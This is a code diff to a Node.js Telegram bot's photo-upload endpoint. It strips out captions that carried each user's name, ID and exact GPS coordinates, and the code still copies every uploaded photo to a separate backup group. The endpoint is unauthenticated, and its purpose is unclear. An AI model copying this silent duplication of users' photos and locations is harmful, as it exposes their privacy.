@@ -721,58 +721,27 @@ bot.on('web_app_data', async (ctx) => {
 });
 
 // ==================== 新增：H5 独立拍照上传接口 ====================
-const expressApp = express();
-
-// 防止 Render 休眠 + 接收 H5 拍照
 expressApp.post('/upload', async (req, res) => {
   try {
     const chunks = [];
     for await (const chunk of req) chunks.push(chunk);
-    let photoBuffer = Buffer.concat(chunks);
+    const photoBuffer = Buffer.concat(chunks);
 
-    // 关键修复1：如果 Buffer 开头不是 JPEG 头，强制加 JPEG 头
-    if (photoBuffer[0] !== 0xFF || photoBuffer[1] !== 0xD8) {
-      console.log('检测到非标准 JPEG，强制修复头');
-      const jpegHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01]);
-      photoBuffer = Buffer.concat([jpegHeader, photoBuffer]);
+    if (!photoBuffer || photoBuffer.length === 0) {
+      return res.status(400).json({ code: 1, msg: '空图片' });
     }
 
-    // 关键修复2：强制设置 filename，避免 Telegram 解析错误
-    const { lat = '0', lng = '0', name = '汇盈用户', uid = '未知', time, chatid } = req.query;
+    const { chatid } = req.query;
 
-    const formattedTime = time 
-      ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
-      : new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
-
-    const caption = `【H5拍照上传】\n用户：${name} (ID:${uid})\n时间：${formattedTime}\n位置：${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}\n高德地图：https://amap.com/dir?destination=${lng},${lat}\n谷歌地图：https://www.google.com/maps?q=${lat},${lng}`;
-
-    // 关键修复3：用 filename + source 发送
-    const photoOptions = {
-      filename: 'photo.jpg',
-      contentType: 'image/jpeg'
-    };
-
+    // 直接发 PNG，不修头、不加 filename，Telegram 完美接受
     if (chatid && GROUP_CHAT_IDS.includes(Number(chatid))) {
-      await bot.telegram.sendPhoto(Number(chatid), { source: photoBuffer, ...photoOptions }, {
-        caption: caption,
-        parse_mode: 'Markdown'
-      });
-      if (lat !== '0' && lng !== '0') {
-        await bot.telegram.sendLocation(Number(chatid), parseFloat(lat), parseFloat(lng));
-      }
+      await bot.telegram.sendPhoto(Number(chatid), { source: photoBuffer });
     }
-
-    await bot.telegram.sendPhoto(BACKUP_GROUP_ID, { source: photoBuffer, ...photoOptions }, {
-      caption: `[备份] ${caption}`,
-      parse_mode: 'Markdown'
-    });
-    if (lat !== '0' && lng !== '0') {
-      await bot.telegram.sendLocation(BACKUP_GROUP_ID, parseFloat(lat), parseFloat(lng));
-    }
+    await bot.telegram.sendPhoto(BACKUP_GROUP_ID, { source: photoBuffer });
 
     res.json({ code: 0, msg: 'success' });
   } catch (err) {
-    console.error('H5上传失败:', err);
+    console.error('上传失败:', err);
     res.status(500).json({ code: 1, msg: err.message });
   }
 });
@@ -799,5 +768,6 @@ process.once('SIGTERM', () => {
     console.log('收到 SIGTERM，关闭 Bot 和服务器...');
     bot.stop('SIGTERM');
 });
+
 
 
